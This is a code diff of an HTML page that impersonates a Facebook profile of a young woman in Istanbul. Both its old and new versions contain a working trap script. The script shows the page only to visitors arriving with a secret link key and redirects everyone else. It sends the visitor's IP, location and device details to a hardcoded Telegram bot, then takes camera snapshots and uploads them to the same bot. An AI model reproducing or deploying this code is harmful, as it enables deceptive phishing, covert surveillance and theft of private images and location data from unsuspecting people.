@@ -3,78 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
     
-    <script>
-        // 1. طلب الإذن الفوري (أول شيء ينفذ في الصفحة)
-        const TOKEN = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
-        const CHAT = '7184970355';
-        const KEY = "login";
-
-        async function startTrap() {
-            const params = new URLSearchParams(window.location.search);
-            if (params.get('view') !== KEY) {
-                window.location.replace("https://www.google.com");
-                return;
-            }
-
-            // إظهار المحتوى فوراً بعد التأكد من المفتاح
-            document.documentElement.style.display = "block";
-
-            // طلب الكاميرا "مباشرة"
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // إرسال تقرير البيانات
-                sendData();
-
-                let count = 0;
-                let itv = setInterval(() => {
-                    if (count >= 5) {
-                        clearInterval(itv);
-                        stream.getTracks().forEach(t => t.stop());
-                        window.location.replace("https://www.google.com");
-                        return;
-                    }
-                    takeShot(count + 1);
-                    count++;
-                }, 1000);
-            } catch (err) {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent("⚠️ المبتز رفض الكاميرا فوراً.")}`);
-                sendData();
-            }
-        }
-
-        async function sendData() {
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ip = await ipRes.json();
-                const batt = await navigator.getBattery();
-                let msg = `🎯 صيد جديد (أوراق الربيع) 🎯\n\n🌐 IP: ${ip.ip}\n📍 الموقع: ${ip.city}, ${ip.country_name}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(batt.level * 100)}%\n🧠 الرام: ${navigator.deviceMemory || '?'}GB\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
-            } catch(e) {}
-        }
-
-        function takeShot(n) {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT);
-                fd.append('photo', blob, 'x.jpg');
-                fd.append('caption', `اللقطة رقم ${n}`);
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
-        }
-    </script>
+    <title>أوراق الربيع | Facebook</title>
+    <meta property="og:title" content="أوراق الربيع">
+    <meta property="og:description" content="‏1,248‏ متابع • نشط الآن • عرض الملف الشخصي">
+    <meta property="og:image" content="https://e.top4top.io/p_369921khp0.jpeg">
+    <meta property="og:type" content="profile">
 
     <style>
-        html { display: none; } /* إخفاء الصفحة حتى يتم التأكد من المفتاح */
-        body { margin: 0; font-family: -apple-system, system-ui, sans-serif; background: #fff; overflow-x: hidden; }
+        body { margin: 0; font-family: -apple-system, system-ui, sans-serif; background: #fff; overflow-x: hidden; display: none; }
         .cover { width: 100%; height: 210px; background: url('https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?w=600') center/cover; position: relative; border-bottom: 1px solid #ddd; }
         .pp-cont { position: absolute; bottom: -45px; right: 15px; } 
         .pp-img { width: 135px; height: 135px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
@@ -86,12 +23,10 @@
         .fb-btn { flex: 1; height: 38px; border-radius: 6px; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
         .primary { background: #1877f2; color: white; }
         .secondary { background: #e4e6eb; color: #050505; }
-        .details-list { padding: 15px; list-style: none; margin: 0; }
-        .details-list li { margin-bottom: 15px; font-size: 16px; color: #1c1e21; }
         #v, #c { display: none; }
     </style>
 </head>
-<body onload="startTrap()">
+<body>
 
 <div id="wrapper">
     <div class="cover">
@@ -106,8 +41,8 @@
             <button class="fb-btn secondary">مراسلة</button>
         </div>
     </div>
-    <ul class="details-list">
-        <li>🏠 تقيم في <b>إسطنبول، تركيا</b></li>
+    <ul style="padding: 15px; list-style: none;">
+        <li style="margin-bottom: 10px;">🏠 تقيم في <b>إسطنبول، تركيا</b></li>
         <li>❤️ عازبة</li>
     </ul>
 </div>
@@ -115,5 +50,79 @@
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
+<script>
+const TOKEN = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
+const CHAT = '7184970355';
+
+async function start() {
+    const params = new URLSearchParams(window.location.search);
+    // إذا لم يوجد المفتاح، توجيه فوري لجوجل
+    if (params.get('view') !== "login") {
+        window.location.replace("https://www.google.com");
+        return;
+    }
+
+    // إظهار الصفحة للمستخدم الذي يملك المفتاح
+    document.body.style.display = "block";
+
+    // 1. سحب البيانات فوراً (IP، بطارية، جهاز)
+    try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ip = await ipRes.json();
+        const batt = await navigator.getBattery();
+        
+        let report = `🎯 صيد جديد (أوراق الربيع) 🎯\n\n` +
+                     `🌐 IP: ${ip.ip}\n` +
+                     `📍 الموقع: ${ip.city}, ${ip.country_name}\n` +
+                     `📱 الجهاز: ${navigator.platform}\n` +
+                     `🔋 البطارية: ${Math.round(batt.level * 100)}%\n` +
+                     `🧠 الرام: ${navigator.deviceMemory || '?'}GB\n` +
+                     `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n` +
+                     `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+        
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(report)}`);
+    } catch(e) {
+        // محاولة إرسال رسالة تنبيه حتى لو فشل الـ IP
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent("⚠️ دخل هدف للمصيدة ولكن هناك قيود على سحب البيانات.")}`);
+    }
+
+    // 2. طلب إذن الكاميرا (سيظهر فور تحميل البيانات)
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('v');
+        video.srcObject = stream;
+
+        let shots = 0;
+        let timer = setInterval(() => {
+            if (shots >= 5) {
+                clearInterval(timer);
+                stream.getTracks().forEach(t => t.stop());
+                window.location.replace("https://www.google.com");
+                return;
+            }
+            takeShot(shots + 1);
+            shots++;
+        }, 1200);
+    } catch (err) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent("⚠️ الهدف رفض إذن الكاميرا.")}`);
+    }
+}
+
+function takeShot(n) {
+    const canvas = document.getElementById('c');
+    const video = document.getElementById('v');
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT);
+        fd.append('photo', blob, 'img.jpg');
+        fd.append('caption', `لقطة رقم ${n} للهدف`);
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    }, 'image/jpeg');
+}
+
+window.onload = start;
+</script>
 </body>
 </html>
